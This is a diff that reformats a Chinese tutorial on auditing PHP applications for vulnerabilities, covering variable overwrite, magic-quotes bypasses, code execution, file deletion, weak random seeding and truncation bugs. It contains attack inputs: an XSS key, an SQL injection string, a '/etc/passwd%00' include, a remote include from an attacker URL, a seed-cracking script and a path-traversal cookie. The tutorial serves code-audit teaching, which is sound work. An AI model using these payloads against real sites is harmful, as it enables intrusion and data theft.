@@ -1,25 +1,22 @@
-#summary Php Application Source Code Audits Advanced Technology - Simplified Chinese
+### summary Php Application Source Code Audits Advanced Technology - Simplified Chinese
+### 高级PHP应用程序漏洞审核技术
 
-= 高级PHP应用程序漏洞审核技术 =
-
-<wiki:toc max_depth="5" />
-
-== 前言 ==
-
+前言
+------------
 PHP是一种被广泛使用的脚本语言，尤其适合于web开发。具有跨平台，容易学习，功能强大等特点，据统计全世界有超过34%的网站有php的应用，包括Yahoo、sina、163、sohu等大型门户网站。而且很多具名的web应用系统（包括bbs,blog,wiki,cms等等）都是使用php开发的，Discuz、phpwind、phpbb、vbb、wordpress、boblog等等。随着web安全的热点升级，php应用程序的代码安全问题也逐步兴盛起来，越来越多的安全人员投入到这个领域，越来越多的应用程序代码漏洞被披露。针对这样一个状况，很多应用程序的官方都成立了安全部门，或者雇佣安全人员进行代码审计，因此出现了很多自动化商业化的代码审计工具。也就是这样的形势导致了一个局面：大公司的产品安全系数大大的提高，那些很明显的漏洞基本灭绝了，那些大家都知道的审计技术都无用武之地了。我们面对很多工具以及大牛扫描过n遍的代码，有很多的安全人员有点悲观，而有的官方安全人员也非常的放心自己的代码，但是不要忘记了“没有绝对的安全”，我们应该去寻找新的途径挖掘新的漏洞。本文就给介绍了一些非传统的技术经验和大家分享。
 
 另外在这里特别说明一下本文里面很多漏洞都是来源于网络上牛人和朋友们的分享，在这里需要感谢他们 ：）
 
-== 传统的代码审计技术 ==
-
+传统的代码审计技术
+------------
 WEB应用程序漏洞查找基本上是围绕两个元素展开：变量与函数。也就是说一漏洞的利用必须把你提交的恶意代码通过变量经过n次变量转换传递，最终传递给目标函数执行，还记得MS那句经典的名言吗？“一切输入都是有害的”。这句话只强调了变量输入，很多程序员把“输入”理解为只是gpc`[`$`_`GET,$`_`POST,$`_`COOKIE`]`，但是变量在传递过程产生了n多的变化。导致很多过滤只是个“纸老虎”！我们换句话来描叙下代码安全：“一切进入函数的变量是有害的”。
 
 PHP代码审计技术用的最多也是目前的主力方法：静态分析，主要也是通过查找容易导致安全漏洞的危险函数，常用的如grep，findstr等搜索工具，很多自动化工具也是使用正则来搜索这些函数。下面列举一些常用的函数，也就是下文说的字典（暂略）。但是目前基本已有的字典很难找到漏洞，所以我们需要扩展我们的字典，这些字典也是本文主要探讨的。
 
 其他的方法有：通过修改PHP源代码来分析变量流程，或者hook危险的函数来实现对应用程序代码的审核，但是这些也依靠了我们上面提到的字典。
 
-== PHP版本与应用代码审计 ==
-
+PHP版本与应用代码审计
+------------
 到目前为止，PHP主要有3个版本：php4、php5、php6，使用比例大致如下：
 
 || php4 || 68% || 2000-2007，No security fixes after 2008/08，最终版本是php4.4.9 ||
@@ -28,21 +25,21 @@ PHP代码审计技术用的最多也是目前的主力方法：静态分析，�
 
 由于php缺少自动升级的机制，导致目前PHP版本并存，也导致很多存在漏洞没有被修补。这些有漏洞的函数也是我们进行WEB应用程序代码审计的重点对象，也是我们字典重要来源。
 
-== 其他的因素与应用代码审计 ==
-
+其他的因素与应用代码审计
+------------
 很多代码审计者拿到代码就看，他们忽视了“安全是一个整体”，代码安全很多的其他因素有关系，比如上面我们谈到的PHP版本的问题，比较重要的还有操作系统类型（主要是两大阵营win/`*`nix），WEB服务端软件（主要是iis/apache两大类型）等因素。这是由于不同的系统不同的WEB SERVER有着不同的安全特点或特性，下文有些部分会涉及。
 
 所以我们在做某个公司WEB应用代码审计时，应该了解他们使用的系统，WEB服务端软件，PHP版本等信息。
 
-== 扩展我们的字典 ==
-
+扩展我们的字典
+------------
 下面将详细介绍一些非传统PHP应用代码审计一些漏洞类型和利用技巧。
 
-=== 变量本身的key ===
+#### 变量本身的key
 
 说到变量的提交很多人只是看到了GET/POST/COOKIE等提交的变量的值，但是忘记了有的程序把变量本身的key也当变量提取给函数处理。
 
-{{{
+``` php
 <?php
 //key.php?aaaa'aaa=1&bb'b=2 
 //print_R($_GET); 
@@ -51,13 +48,13 @@ PHP代码审计技术用的最多也是目前的主力方法：静态分析，�
 	print $key."\n";
 }
 ?>
-}}}
+```
 
 上面的代码就提取了变量本身的key显示出来，单纯对于上面的代码，如果我们提交URL：
 
-{{{
+```
 key.php?<script>alert(1);</script>=1&bbb=2
-}}}
+```
 
 那么就导致一个xss的漏洞，扩展一下如果这个key提交给include()等函数或者sql查询呢？：） 
 
@@ -72,7 +69,7 @@ key.php?<script>alert(1);</script>=1&bbb=2
 
 请看如下代码：
 
-{{{
+``` php
 <?php
 //var.php?a=fuck
 $a='hi';
@@ -81,11 +78,11 @@ foreach($_GET as $key => $value) {
 }
 print $a;
 ?>
-}}}
+```
 
 很多的WEB应用都使用上面的方式（注意循环不一定是foreach），如Discuz!4.1的WAP部分的代码：
 
-{{{
+``` php
 $chs = '';
 if($_POST && $charset != 'utf-8') {
 	$chs = new Chinese('UTF-8', $charset);
@@ -93,28 +90,28 @@ if($_POST && $charset != 'utf-8') {
 		$$key = $chs->Convert($value);
 	}
 	unset($chs);
-}}}
+```
 
 || *漏洞审计策略* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
 
 ==== parse_str()变量覆盖漏洞 ====
 
-{{{
+``` php
 //var.php?var=new
 $var = 'init';                     
 parse_str($_SERVER['QUERY_STRING']); 
 print $var;
-}}}
+```
  
 该函数一样可以覆盖数组变量，上面的代码是通过$`_`SERVER['QUERY_STRING']来提取变量的，对于指定了变量名的我们可以通过注射“=”来实现覆盖其他的变量：
 
-{{{
+```
 //var.php?var=1&a[1]=var1%3d222
 $var1 = 'init';
 parse_str($a[$_GET['var']]);
 print $var1;
-}}}
+```
 
 上面的代码通过提交$var来实现对$var1的覆盖。
 
@@ -127,13 +124,13 @@ print $var1;
 
 ==== import_request_variables()变量覆盖漏洞 ====
 
-{{{
+```
 //var.php?_SERVER[REMOTE_ADDR]=10.1.1.1
 echo 'GLOBALS '.(int)ini_get("register_globals")."n";
 import_request_variables('GPC');
 if ($_SERVER['REMOTE_ADDR'] != '10.1.1.1') die('Go away!');
 echo 'Hello admin!';
-}}}
+```
 
 || *漏洞审计策略（import_request_variables）* ||
 || PHP版本要求：php4<4.4.1 php5<5.2.2<br>系统要求：无<br>审计策略：查找字符import_request_variables ||
@@ -142,23 +139,23 @@ echo 'Hello admin!';
 
 从严格意义上来说这个不可以算是PHP的漏洞，只能算是一个特性，测试代码：
 
-{{{
+```
 <?
 // register_globals =ON
 //foo.php?GLOBALS[foobar]=HELLO
 php echo $foobar; 
 ?>
-}}}
+```
 
 但是很多的程序没有考虑到这点，请看如下代码：
 
-{{{
+```
 //为了安全取消全局变量
 //var.php?GLOBALS[a]=aaaa&b=111
 if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(${$k});
 print $a;
 print $_GET[b];
-}}}
+```
 
 如果熟悉WEB2.0的攻击的同学，很容易想到上面的代码我们可以利用这个特性进行crsf攻击。
 
@@ -189,13 +186,13 @@ PHP5的$`_`SERVER变量缺少magic_quotes_gpc的保护，导致近年来X-Forwar
 
 主要应用与soap/xmlrpc/webpublish功能里，请看如下代码：
 
-{{{
+```
 if ( !isset( $HTTP_RAW_POST_DATA ) ) {
 	$HTTP_RAW_POST_DATA = file_get_contents( 'php://input' );
 }
 if ( isset($HTTP_RAW_POST_DATA) )
 	$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);
-}}}
+```
 	        
 || *漏洞审计策略（数据流）* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符HTTP_RAW_POST_DATA或者php://input ||
@@ -204,7 +201,7 @@ if ( isset($HTTP_RAW_POST_DATA) )
 
 如Discuz!<5.0的pm.php：
      
-{{{
+```
 if(is_array($msgtobuddys)) {
 	$msgto = array_merge($msgtobuddys, array($msgtoid));
 		......
@@ -216,7 +213,7 @@ foreach($msgto as $uid) {
 $query = $db->query("SELECT m.username, mf.ignorepm FROM {$tablepre}members m
 	LEFT JOIN {$tablepre}memberfields mf USING(uid)
 	WHERE m.uid IN ($uids)");
-}}}
+```
 
 || *漏洞审计策略* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：查找数据库操作字符（select,update,insert等等） ||
@@ -246,15 +243,15 @@ _另外一个 unserialize/serialize_
 
 目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：
 
-{{{
+```
 $sql = "SELECT * FROM article WHERE articleid='".urldecode($_GET[id])."'";
-}}}
+```
 
 当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：
 
-{{{
+```
 SELECT * FROM article WHERE articleid='''
-}}}
+```
 
 || *漏洞审计策略* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应的编码函数 ||
@@ -279,15 +276,15 @@ _详细见附录`[`1`]`_
 
 首先我们看下魔术引号的处理机制：
 
-{{{
+```
 [\-->\\,'-->\',"-->\",null-->\0]
-}}}
+```
 
 这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：
 
 *1)得到原字符（',\,",null]）*
 
-{{{
+```
 $order_sn=substr($_GET['order_sn'], 1);
 
 //提交                 '
@@ -298,11 +295,11 @@ $sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
    " shipping_time, shipping_id, invoice_no, user_id ".
    " FROM " . $ecs->table('order_info').
    " WHERE order_sn = '$order_sn' LIMIT 1";
-}}}
+```
 
 *2)得到“\”字符*
 
-{{{
+```
 $order_sn=substr($_GET['order_sn'], 0,1);
 
 //提交                 '
@@ -313,21 +310,21 @@ $sql = "SELECT order_id, order_status, shipping_status, pay_status, ".
    " shipping_time, shipping_id, invoice_no, user_id ".
    " FROM " . $ecs->table('order_info').
    " WHERE order_sn = '$order_sn' and order_tn='".$_GET['order_tn']."'";
-}}}
+```
    
 提交内容：
 
-{{{
+```
 ?order_sn='&order_tn=%20and%201=1/* 
-}}}
+```
 
 执行的SQL语句为：
 
-{{{
+```
 SELECT order_id, order_status, shipping_status, pay_status, shipping_time, 
 shipping_id, invoice_no, user_id FROM order_info WHERE order_sn = '\' and 
 order_tn=' and 1=1/*'
-}}}
+```
 
 || *漏洞审计策略* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：查找字符串处理函数如substr或者通读代码 ||
@@ -336,7 +333,7 @@ order_tn=' and 1=1/*'
 
 我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？
 
-{{{
+```
 <?php
 //key.php?aaaa'aaa=1&bb'b=2 
 //print_R($_GET); 
@@ -345,29 +342,29 @@ order_tn=' and 1=1/*'
         print $key."\n";
         }
 ?>
-}}}
+```
 
 *1)当magic_quotes_gpc = On时，在php5.24下测试显示：*
 
-{{{
+```
 aaaa\'aaa
 bb\'b
-}}}
+```
 
 从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php<5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：
 
-{{{
+```
 <?php
 //key.php?aaaa'aaa[bb']=1 
 print_R($_GET); 
 ?>
-}}}
+```
 
 结果显示:
 
-{{{
+```
 Array ( [aaaa'aaa] => Array ( [bb\'] => 1 ) ) 
-}}}
+```
 
 数组第一维变量的key不受魔术引号的影响。
 
@@ -377,14 +374,14 @@ Array ( [aaaa'aaa] => Array ( [bb\'] => 1 ) )
 
 *2)当magic_quotes_gpc = Off时，在php5.24下测试显示：*
 
-{{{
+```
 aaaa'aaa
 bb'b
-}}}
+```
 
 对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：
 
-{{{
+```
 <?php 
 //keyvul.php?aaa'aa=1'
 //magic_quotes_gpc = Off
@@ -403,17 +400,17 @@ foreach ($_GET AS $key => $value)
 	print $key;
 }
 ?>
-}}}
+```
 
 以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：
 
-{{{
+```
 Array
 (
     [aaa'aa] => 1\'
 )
 aaa'aa
-}}}
+```
 
 || *漏洞审计策略* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
@@ -433,7 +430,7 @@ aaa'aa
 
 这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：
 
-{{{
+```
 <?php
 //how to exp this code
 $sort_by=$_GET['sort_by'];
@@ -442,7 +439,7 @@ $databases=array('test','test');
 $sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);
 	      ';
 usort($databases, create_function('$a, $b', $sort_function));
-}}}
+```
 
 || *漏洞审计策略* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等） ||
@@ -451,14 +448,14 @@ usort($databases, create_function('$a, $b', $sort_function));
      
 对于单引号和双引号的区别，很多程序员深有体会，示例代码：
 
-{{{
+```
 echo "$a\n";
 echo '$a\n';
-}}}
+```
 
 我们再看如下代码：
 
-{{{
+```
 //how to exp this code
 if($globals['bbc_email']){
 
@@ -467,7 +464,7 @@ $text = preg_replace(
 				"/\[email\](.*?)\[\/email\]/ies"),
 		array('check_email("$1", "$2")',
 				'check_email("$1", "$1")'), $text);
-}}}
+```
 						
 另外很多的应用程序都把变量用""存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。
    
@@ -480,9 +477,9 @@ $text = preg_replace(
 
 大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录[2]）项目么，其中比较有名的要算是unserialize()，代码如下：
 
-{{{
+```
 unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data']);
-}}}
+```
 
 在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。
 
@@ -495,7 +492,7 @@ Stefan Esser大牛发现的漏洞：unset()--Zend_Hash_Del_Key_Or_Index Vulnerab
     
 比如phpwind早期的serarch.php里的代码：
 
-{{{
+```
 unset($uids);
 ......
 $query=$db->query("SELECT uid FROM pw_members WHERE username LIKE '$pwuser'");
@@ -505,7 +502,7 @@ while($member=$db->fetch_array($query)){
 $uids ? $uids=substr($uids,0,-1) : $sqlwhere.=' AND 0 ';
 ........
 $query = $db->query("SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit");
-}}}
+```
     
 || *漏洞审计策略* ||
 || PHP版本要求：php4<4.3 php5<5.14<br>系统要求：无<br>审计策略：查找unset ||
@@ -516,7 +513,7 @@ _测试PHP版本：5.1.2_
     
 这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：
 
-{{{
+```
 <?php 
 //val.php   
 session_save_path('./');
@@ -530,7 +527,7 @@ if($_GET['del']) {
 	print_r($_SESSION);
 }
 ?>
-}}}
+```
 
 当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink('sess`_`/../1.php')这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。
 
@@ -541,17 +538,17 @@ if($_GET['del']) {
    
 *1) rand() VS mt_rand()*
 
-{{{
+```
 <?php
 //on windows
 print mt_getrandmax(); //2147483647
 print getrandmax();// 32767
 ?>
-}}}
+```
 
 可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 
 
-{{{
+```
 <?php
 $a= md5(rand());
 for($i=0;$i<=32767;$i++){
@@ -560,7 +557,7 @@ for($i=0;$i<=32767;$i++){
    }else { print $i."<br>";}
 }
 ?>
-}}}
+```
 
 当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。
 
@@ -571,20 +568,20 @@ for($i=0;$i<=32767;$i++){
 
 看php手册里的描述：
 
-{{{
+```
 mt_srand
 (PHP 3 >= 3.0.6, PHP 4, PHP 5)
 
 mt_srand -- 播下一个更好的随机数发生器种子
 说明
 void mt_srand ( int seed )
-}}}
+```
 
 用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 
 
 例子 1. mt_srand() 范例
 
-{{{
+```
 <?php
 // seed with microseconds
 function make_seed()
@@ -595,25 +592,25 @@ function make_seed()
 mt_srand(make_seed());
 $randval = mt_rand();
 ?> 
-}}}
+```
  
 _注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已自动完成。_
 
 php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：
 
-{{{
+```
 mt_srand ((double) microtime() * 1000000)
-}}}
+```
 
 但是使用(double)microtime()`*`1000000类似的代码seed是比较脆弱的：
 
-{{{
+```
 0<(double) microtime()<1 ---> 0<(double) microtime()* 1000000<1000000
-}}}
+```
 
 那么很容易暴力破解,测试代码如下：
 
-{{{
+```
 <?php
 /////////////////
 //>php rand.php
@@ -638,7 +635,7 @@ for($seed=0;$seed<=$max;$seed++){
 return false;
 }
 ?>
-}}}
+```
 
 从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：
 
@@ -660,7 +657,7 @@ return false;
 
 在32位系统上默认的播种的种子为最大值是`2^32`，这样我们循环最多`2^32`次就可以破解seed。而在PHP 4和PHP 5 <= 5.2.0 的算法有个bug：奇数和偶数的播种是一样的（详见附录[3]）,测试代码如下：
 
-{{{
+```
 <?php
 mt_srand(4); 
 $a = mt_rand(); 
@@ -668,11 +665,11 @@ mt_srand(5);
 $b = mt_rand();
 print $a."\n".$b;
 ?>
-}}}
+```
 
 通过上面的代码发现$a==$b，所以我们循环的次数为2^32/2=2^31次。我们看如下代码：
 
-{{{
+```
 <?php
 //base on http://www.milw0rm.com/exploits/6421 
 //test on php 5.2.0
@@ -713,11 +710,11 @@ function getseed($resetkey) {
 	return false;
 }
 ?>
-}}}
+```
 
 运行结果如下：
 
-{{{
+```
 php5>php rand.php
 M8pzpjwCrvVt3oobAaOr
 0123456789101112131415161718192021222324252627282930313233343536373839404142434
@@ -734,20 +731,20 @@ M8pzpjwCrvVt3oobAaOr
 3o
 70693
 pjwCrvVt3oobAaOr
-}}}
+```
 
 当10634次时候我们得到了结果。
 
 当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样。比如：
 
-{{{
+```
 <?php
 mt_srand(42);
 echo mt_rand();
 //php<=5.20 1387371436
 //php>5.20 1354439493 		
 ?>
-}}}
+```
 
 正是这个原因，也要求了我们的exp的运行环境：当目标>5.20时候，我们exp运行的环境也要是>5.20的版本，反过来也是一样。
 
@@ -769,15 +766,15 @@ echo mt_rand();
 
 ===== include截断 =====
 
-{{{
+```
 <?php 
 include $_GET['action'].".php"; 
 ?>
-}}}
+```
 
 提交“action=/etc/passwd%00”中的“%00”将截断后面的“.php”，但是除了“%00”还有没有其他的字符可以实现截断使用呢？肯定有人想到了远程包含的url里问号“?”的作用，通过提交“action=`http://www.hacksite.com/evil-code.txt`?”这里“?”实现了“伪截断”：），好象这个看上去不是那么舒服那么我们简单写个代码fuzz一下：
 
-{{{
+```
 <?php
 ////////////////////
 ////var5.php代码:
@@ -798,7 +795,7 @@ for($i=0;$i<50000;$i++)
 	}
 }
 ?>
-}}}
+```
 
 经过测试字符“.”、“ /”或者2个字符的组合，在一定的长度时将被截断，win系统和`*`nix的系统长度不一样，当win下strlen(realpath("./"))+strlen($`_`GET`['action']`)的长度大于256时被截断，对于`*`nix的长度是4 `*` 1024 = 4096。对于php.ini里设置远程文件关闭的时候就可以利用上面的技巧包含本地文件了。（此漏洞由cloie#ph4nt0m.org最先发现]）
 
@@ -810,7 +807,7 @@ for($i=0;$i<50000;$i++)
 
 这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：
     
-{{{
+```
 mysql> insert into truncated_test(`username`,`password`) values("admin","pass");
 
 mysql> insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");
@@ -824,13 +821,13 @@ mysql> select * from truncated_test;
 | 2 | admin      | new_pass |
 +----+------------+----------+
 2 rows in set (0.00 sec)
-}}}
+```
 
 *2) Mysql charset Truncation vulnerability*
 
 这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：
     
-{{{
+```
 mysql> insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");
 Query OK, 1 row affected, 1 warning (0.00 sec)
 
@@ -843,17 +840,17 @@ mysql> select * from truncated_test;
 | 3 | admin      | new_pass2 |
 +----+------------+----------+
 2 rows in set (0.00 sec)
-}}}
+```
     
 很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：
 
-{{{
+```
 $result = mysql_query("SELECT * from test_user where user='$user' ");
   ....
 if(@mysql_fetch_array($result, MYSQL_NUM)) {
 	die("already exist");
 }
-}}}
+```
 
 || *漏洞审计策略* ||
 || PHP版本要求：无<br>系统要求：无<br>审计策略：通读代码 ||
@@ -864,7 +861,7 @@ if(@mysql_fetch_array($result, MYSQL_NUM)) {
     
 下面还给大家介绍一个非常有意思的问题：
 
-{{{
+```
 //Is this code vul?
 if( eregi(".php",$url) ){
 	die("ERR");
@@ -872,20 +869,20 @@ if( eregi(".php",$url) ){
 $fileurl=str_replace($webdb[www_url],"",$url);
 .....
 header('Content-Disposition: attachment; filename='.$filename);
-}}}
+```
     
 很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：
 
-{{{
+```
 $fileurl=str_replace($webdb[www_url],"",$url);
 if( eregi(".php",$url) ){
 	die("ERR");
 }
-}}}
+```
 
 str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：
 
-{{{
+```
 <?php
 for($i=0;$i<255;$i++) {
 	$url = '1.ph'.chr($i);
@@ -893,7 +890,7 @@ for($i=0;$i<255;$i++) {
 	if(!empty($tmp)) echo chr($i)."\r\n";
 }  
 ?>
-}}}
+```
 
 我们在windows系统运行上面的代码得到如下字符`*` < > ? P p都可以打开目录下的1.php。
 
@@ -920,7 +917,7 @@ for($i=0;$i<255;$i++) {
 
 第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：
 
-{{{
+```
 heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5
 ./include/global.func.php-694-  $GLOBALS['rewritecompatible'] && $name = rawurlencode($name);
 ./include/global.func.php-695-  return '<a href="tag-'.$name.'.html"'.stripslashes($extra).'>';
@@ -945,21 +942,21 @@ heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5
 ./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;
 ./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];
 ./include/discuzcode.func.php-40-       if($attach['attachimg']) {
-}}}
+```
 
 有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：
 
-{{{
+```
  PHP_VERSION < '4.2.0' && mt_srand((double)microtime() * 1000000);
-}}}
+```
 
 判断了版本，如果是PHP_VERSION > '4.2.0'使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：
 
 1) 'Cross Application Attacks' 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() `*` 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： 
 
-{{{
+```
 ./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);
-}}}
+```
 
 这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）
 
